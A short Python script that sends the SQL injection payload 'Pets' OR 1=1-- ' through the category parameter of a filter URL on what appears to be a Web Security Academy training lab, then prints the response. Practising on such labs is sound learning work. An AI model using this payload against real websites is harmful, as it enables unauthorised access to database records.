import requests

url = "https://0afa00b904241260806d807f0014006c.web-security-academy.net/filter?"

payload = "Pets' OR 1=1-- "

params = {
    "category": payload
}

res = requests.get(url, params=params)

print(res.text[:1000])